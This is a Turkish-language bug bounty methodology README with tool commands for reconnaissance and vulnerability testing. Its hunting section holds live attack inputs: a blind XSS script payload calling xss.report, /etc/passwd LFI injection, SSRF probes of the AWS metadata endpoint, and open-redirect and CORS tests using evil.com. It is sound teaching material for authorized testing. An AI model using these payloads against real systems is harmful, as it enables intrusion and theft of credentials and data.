# 🐛 Bug Bounty Metodolojisi

[🇬🇧 English](../../README.md) • [🇮🇹 Versione Italiana](README.it.md)

```
  ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
  ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
  ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
  ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
  ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
  ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
            Kapsamlı Bug Bounty ve Güvenlik Açığı Avcılığı Metodolojisi
```

<p align="center">
  <img src="https://img.shields.io/badge/Bug_Bounty-Metodoloji-red?style=for-the-badge" alt="Bug Bounty">
  <img src="https://img.shields.io/badge/Keşif-Recon-blue?style=for-the-badge" alt="Recon">
  <img src="https://img.shields.io/badge/Zafiyet-Vulnerability-green?style=for-the-badge" alt="Vuln">
</p>

---

## 🗺️ Saldırı Akışı Genel Bakışı (Attack Flow)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       BUG BOUNTY AVCILIK METODOLOJİSİ                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  FAZ 1: Alt Alan Adı Keşfi   FAZ 2: ASN & IP Tespiti  FAZ 3: Canlı Hedefler │
│  ├── Subfinder               ├── ASN Haritalama       ├── HTTPX Probing     │
│  ├── Amass                   ├── IP Toplama           ├── Port Keşfi        │
│  ├── crt.sh                  └── Shodan               └── Aquatone Ekran G. │
│  └── Wayback Archive                                                        │
│                                                                             │
│  FAZ 4: URL & Parametre      FAZ 5: Zafiyet Avı       FAZ 6: Derinlemesine  │
│  ├── Katana / Hakrawler      ├── XSS Testleri         ├── Dizin Taraması    │
│  ├── GAU                     ├── LFI / RFI            ├── Parametre Fuzzing │
│  └── Parametre Çıkarma       ├── SSRF / CORS          └── .git İfşası       │
│                              └── Açık Yönlendirme                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 İçindekiler

1. [Faz 1: Alt Alan Adı Keşfi (Subdomain Enumeration)](#-faz-1-alt-alan-adı-keşfi-subdomain-enumeration)
2. [Faz 2: ASN ve IP Keşfi](#-faz-2-asn-ve-ip-keşfi)
3. [Faz 3: Canlı Host Keşfi (Live Host Discovery)](#-faz-3-canlı-host-keşfi-live-host-discovery)
4. [Faz 4: URL ve Endpoint Toplama](#-faz-4-url-ve-endpoint-toplama)
5. [Faz 5: Zafiyet Avcılığı (Vulnerability Hunting)](#-faz-5-zafiyet-avcılığı-vulnerability-hunting)
6. [Faz 6: Dizin, Dosya ve Gizli Parametre Keşfi](#-faz-6-dizin-dosya-ve-gizli-parametre-keşfi)
7. [Hızlı Başvuru Tablosu ve Otomasyon Zinciri](#-hızlı-başvuru-tablosu-ve-otomasyon-zinciri)
8. [Araç Kurulumları](#-araç-kurulumları)
9. [Bug Bounty İpuçları](#-bug-bounty-i̇puçları)

---

## 🔍 Faz 1: Alt Alan Adı Keşfi (Subdomain Enumeration)

> **Hedef:** Hedefe ait olabildiğince çok alt alan adı bulmak; saldırı yüzeyi ne kadar geniş olursa açık bulma ihtimali o kadar artar.

### Otomatik Keşif Araçları

#### Subfinder
```bash
# Birden çok pasif kaynaktan hızlı alt alan adı keşfi
subfinder -d example.com -all -recursive -o subfinder.txt

# Bayrakların anlamı:
# -all: Tüm kaynakları kullan (ücretsiz + premium API'ler)
# -recursive: Alt alan adlarının da alt alanlarını ara
# -o: Çıktı dosyası
```
> 💡 **İpucu:** Subfinder son derece hızlı ve güvenilirdir. En kapsamlı sonuç için `-all` parametresini kullanın.

#### Assetfinder
```bash
# Hedefle ilişkili domain ve subdomain'leri listeleme
assetfinder --subs-only example.com > assetfinder.txt
```

#### Sublist3r
```bash
# Farklı arama motorları ve OSINT servisleri üzerinden arama
sublist3r -d example.com -e baidu,yahoo,google,bing,ask,netcraft,virustotal,threatcrowd,crtsh,passivedns -v -o sublist3r.txt
```

#### Amass
```bash
# Derinlemesine saldırı yüzeyi haritalama
amass enum -passive -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt

# Pasif mod hedefe doğrudan paket göndermez, güvenlidir.
# Daha fazla sonuç için -active kullanılabilir (ancak gürültülüdür).
```

### Kamuya Açık Pasif Kaynaklar

#### Sertifika Şeffaflığı (Certificate Transparency - crt.sh)
```bash
# SSL sertifika loglarından alt alan adlarını çekme
curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' > crtsh.txt
```
> 💡 **Neden crt.sh?** SSL sertifikaları halka açık kayıtlardır ve unutulmuş alt alan adlarını bulmak için ücretsiz istihbarattır.

#### Web Arşivleri (Wayback Machine)
```bash
# Web arşivlerinden geçmiş alt alan adlarını çıkarma
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
```

### Alt Alan Adı İşleme ve Genişletme

#### Birleştirme ve Tekilleştirme (Deduplication)
```bash
# Tüm çıktıları birleştirip tekrarlananları temizleme
cat *.txt | sort -u > final_subdomains.txt

# Bulunan toplam alt alan adı sayısı:
wc -l final_subdomains.txt
```

#### FFUF ile DNS Brute Force
```bash
# Kelime listesiyle doğrudan subdomain brute force
ffuf -u "https://FUZZ.example.com" -w wordlist.txt -mc 200,301,302

# Örnek kelime listesi: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Alterx ile Permütasyon Üretme
```bash
# Bulunan subdomain'lerden türev varyasyonlar üretip çözümleme
subfinder -d example.com | alterx | dnsx

# Sık kullanılan kelime kalıplarıyla zenginleştirme
echo example.com | alterx -enrich | dnsx
```
> 💡 **Örnek:** Eğer `dev.example.com` bulduysanız, Alterx otomatik olarak `dev1`, `dev2`, `dev-api`, `test-dev` gibi olasılıkları dener.

---

## 🌐 Faz 2: ASN ve IP Keşfi

> **Hedef:** Hedef kuruluşa ait IP bloklarını (CIDR) ve doğrudan sunucu altyapılarını tespit etmek.

### ASN Haritalama
```bash
# Hedef alan adının ASN numarasına ait IP bloklarını bulma
asnmap -d example.com | dnsx -silent -resp-only

# Kurum adına göre ASN ve varlık taraması
amass intel -org "Kurum Adı"

# Belirli bir IP aralığındaki varlıklar
amass intel -active -cidr 159.69.129.82/32

# ASN numarasına göre arama
amass intel -active -asn [ASN_NUMARASI]
```

### IP Hasadı (IP Harvesting)

#### Shodan SSL Taraması
```bash
# Hedefin SSL sertifikasını kullanan tüm sunucuları Shodan ile bulma
shodan search Ssl.cert.subject.CN:"example.com" 200 --fields ip_str | httpx -sc -title -server -td
```
> 💡 **İpucu:** Bu teknik, Cloudflare veya WAF arkasına gizlenmiş gerçek kaynak sunucu IP adreslerini (Origin IP) tespit etmek için birebirdir!

---

## ✅ Faz 3: Canlı Host Keşfi (Live Host Discovery)

> **Hedef:** Binlerce alt alan adı arasından gerçekten yanıt veren, HTTP/HTTPS servisleri açık hedefleri filtrelemek.

### HTTPX ile Durum Tespiti
```bash
# Çoklu port üzerinde hızlı canlılık testi
cat subdomain.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

# Başlık, sunucu bilgisi, durum kodu ve teknoloji tespiti ile ayrıntılı tarama
cat subdomain.txt | httpx -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200

# Parametreler:
# -sc: HTTP Durum Kodu (Status Code)
# -title: Sayfa Başlığı (Title)
# -server: Web Sunucu Başlığı (Server Header)
# -td: Çalışan Teknolojiler (Technology Detection - Nginx, React, PHP vb.)
```

### Aquatone ile Görsel Keşif
```bash
# Canlı hostların otomatik ekran görüntülerini alma
cat hosts.txt | aquatone -ports 80,443,8000,8080,8443
```
> 💡 **Görsel Keşif Neden Önemli?** Yüzlerce siteyi tek tek gezmek yerine bir HTML galerisinde ilginç yönetim panellerini, test arayüzlerini ve 403 hata sayfalarını saniyeler içinde görebilirsiniz.

---

## 🔗 Faz 4: URL ve Endpoint Toplama

> **Hedef:** Test edilebilecek tüm parametreli linkleri, gizli endpoint'leri ve API yollarını toplamak.

### Aktif Tarama (Active Crawling)

#### Katana
```bash
# Yeni nesil hızlı web tarayıcısı
katana -u livesubdomains.txt -d 2 -o urls.txt
```

#### Hakrawler
```bash
cat urls.txt | hakrawler -u > crawled_urls.txt
```

### Pasif URL Toplama

#### GAU (Get All URLs)
```bash
# Wayback, Common Crawl ve AlienVault'tan tüm geçmiş URL'leri çekme
cat livesubdomains.txt | gau | sort -u > passive_urls.txt

# Yalnızca HTTP 200 dönmüş olanları tekilleştirerek kaydetme
echo example.com | gau --mc 200 | urldedupe > urls.txt
```

### Parametre Çıkarma (Test Edilecek Hedefler)
```bash
# İçinde '=' bulunan parametreli URL'leri filtreleme
cat allurls.txt | grep '=' | urldedupe | tee params_urls.txt

# GF ile zafiyet kalıplarına göre filtreleme
cat allurls.txt | gf sqli    # SQLi adayı URL'ler
cat allurls.txt | gf xss     # XSS adayı URL'ler
cat allurls.txt | gf lfi     # LFI adayı URL'ler
cat allurls.txt | gf ssrf    # SSRF adayı URL'ler
```

---

## 🔓 Faz 5: Zafiyet Avcılığı (Vulnerability Hunting)

### 🔴 XSS (Cross-Site Scripting) Taraması

#### Reflected XSS Boru Hattı (Pipeline)
```bash
subfinder -d "example.com" -all -recursive | \
httpx -mc 200 -silent | \
sed -E 's,https?://(www\.)?,,' | anew | \
urlfinder -all | \
grep -aE '\?.*=.*(&.*)?' | \
grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|png|jpg|jpeg|js|json|pdf|gif|xml)($|\s|\?|&|#)" | \
awk -F'[?&=]' '!seen[$1$2]++' | anew xss_targets.txt
```

#### Blind XSS Testleri
Kullanıcı girdilerinin yönetici paneline düştüğü yerlerde XSS Hunter veya Burp Collaborator payload'ları kullanılır:
```html
"><script src=https://xss.report/c/kullanici></script>
```

### 🔴 LFI (Local File Inclusion) Tespiti
```bash
# GAU ve GF LFI üzerinden ffuf ile test
echo "https://example.com/" | gau | gf lfi | uro | \
sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | \
xargs -I{} ffuf -u {} -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

# Doğrudan /etc/passwd enjeksiyonu ve yanıt kontrolü
gau example.com | gf lfi | qsreplace "/etc/passwd" | \
xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "ZAFİYET BULUNDU: %"'
```

### 🔴 Açık Yönlendirme (Open Redirect) Tespiti
```bash
# Yönlendirme parametrelerini arama
cat urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|next=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_url=|rurl=|target=|to=|url=" | tee redirect_params.txt

# Parametre değerini değiştirerek test etme
cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

### 🔴 SSRF (Server-Side Request Forgery) Tespiti
```bash
# SSRF olası parametreleri filtreleme
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=' | sort -u

# Yerel döngü (localhost) testi
curl "https://example.com/page?url=http://127.0.0.1:80/"

# Bulut metaveri servisi testi (AWS IMDS)
curl "https://example.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
```

### 🔴 CORS Hatalı Yapılandırma Testi
```bash
# Özel Origin başlığı göndererek Access-Control başlıklarını inceleme
curl -H "Origin: http://evil.com" -I https://example.com/api/ | \
grep -i -e "access-control-allow-origin" -e "access-control-allow-credentials"
```
> 💡 **Kritik CORS:** Eğer `Access-Control-Allow-Origin: http://evil.com` ve `Access-Control-Allow-Credentials: true` yanıtı dönüyorsa, kullanıcı oturum verileri çalınabilir!

### 🔴 Nuclei ile Otomatik Zafiyet Taraması
```bash
# Yalnızca kritik ve yüksek seviyeli şablonları çalıştırma
nuclei -l live_domains.txt -s critical,high -bs 50 -c 30 -o nuclei_high_crit.txt

# Belirli bir zafiyet kategorisini tarama (Örn: CVE'ler veya Açık Paneller)
nuclei -l live_domains.txt -tags cve,panel,exposure -o findings.txt
```

---

## 📂 Faz 6: Dizin, Dosya ve Gizli Parametre Keşfi

### Hassas Dosya Avcılığı
```bash
# URL listesinden yedek, konfigürasyon ve veritabanı uzantılarını filtreleme
cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|zip|tar\.gz|bak|7z|rar|log|secret|db|backup|yml|gz|config|env|ini|conf|properties|key)$"
```

### Dizin Taraması (FFUF)
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-u https://example.com/FUZZ \
-fc 404,429,500,502,503 \
-recursion -recursion-depth 2 \
-e .html,.php,.txt,.zip,.bak,.old,.log,.json,.config,.env \
-ac -c -t 20
```

### Açıkta Kalan .git Dizinleri
```bash
# .git dizini açık mı kontrolü
cat domains.txt | httpx -path "/.git/" -mc 200 -location -ms "Index of"

# Eğer açıksa kaynak kodunu yerel ortama çekme
git-dumper https://example.com/.git/ output_repo/
```

### Gizli Parametre Keşfi (Arjun)
```bash
# Bir API veya PHP dosyasında gizli parametreleri tarama
arjun -u https://example.com/endpoint.php -m GET,POST -oT arjun_results.txt
```

### Alt Alan Adı Ele Geçirme (Subdomain Takeover - Subzy)
```bash
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```

---

## 📊 Hızlı Başvuru Tablosu ve Otomasyon Zinciri

### Tek Satırlık Hızlı Komutlar

| Amaç | Komut |
|------|-------|
| Alt alan adları bul | `subfinder -d target.com -silent` |
| Canlı hostları süz | `cat subs.txt \| httpx -silent` |
| Geçmiş URL'leri topla | `echo target.com \| gau` |
| Parametreleri filtrele | `cat urls.txt \| grep '='` |
| Nuclei kritik tarama | `nuclei -l hosts.txt -s critical,high` |

### Takip Edilmesi Gereken Dosya Uzantıları

| Kategori | Uzantılar |
|----------|-----------|
| **Konfigürasyon** | `.env, .config, .conf, .ini, .yml, .yaml` |
| **Yedek Dosyaları** | `.bak, .old, .backup, .zip, .tar.gz, .7z` |
| **Kaynak Kodlar** | `.php, .asp, .aspx, .jsp, .py, .rb, .git` |
| **Veritabanı** | `.sql, .db, .sqlite, .json, .xml` |
| **Belgeler** | `.pdf, .doc, .docx, .xls, .xlsx` |

---

## 🛠️ Araç Kurulumları

```bash
# Go tabanlı çekirdek keşif araçları
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/ffuf/ffuf/v2@latest
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/tomnomnom/gf@latest

# Python araçları
pip3 install uro arjun git-dumper
```

---

## 🎯 Bug Bounty İpuçları

1. **Otomasyonla başlayın ama manuel doğrulayın:** Araçlar potansiyel yerleri bulur, açığı kanıtlayan siz olursunuz.
2. **robots.txt ve sitemap.xml dosyalarını asla atlamayın:** Genellikle geliştiricilerin gizlemeye çalıştığı test ve admin yollarını gösterir.
3. **JavaScript dosyalarını inceleyin:** İçerisinde gizlenmiş API anahtarları, gizli endpoint'ler ve yetkilendirme parametreleri barındırır.
4. **Zafiyetleri zincirleyin (Chaining):** Tek başına düşük seviyeli bir SSRF veya Açık Yönlendirme, XSS veya Token çalma ile birleştiğinde Kritik (Critical) rapora dönüşür.
5. **Rapor kalitesi ödülü belirler:** Net bir etki açıklaması, adım adım yeniden üretim adımları ve ekran kayıtları hazırlayın.

---

## 📚 İlgili Kılavuzlar

- [Nuclei](../../Nuclei/README.md)
- [ffuf](../../ffuf/README.md)
- [Subfinder](../../Subfinder/README.md)
- [httpx](../../httpx/README.md)
- [Burp Suite](../../Burp-Suite/README.md)
- [Google Dorking](../../Google-Dorking/README.md)

---

<p align="center">
  <b>🐛 Başarılı Avlar!</b><br>
  <i>Bug Bounty: Sabır, merak ve disiplinin ödüllendirildiği yer.</i>
</p>
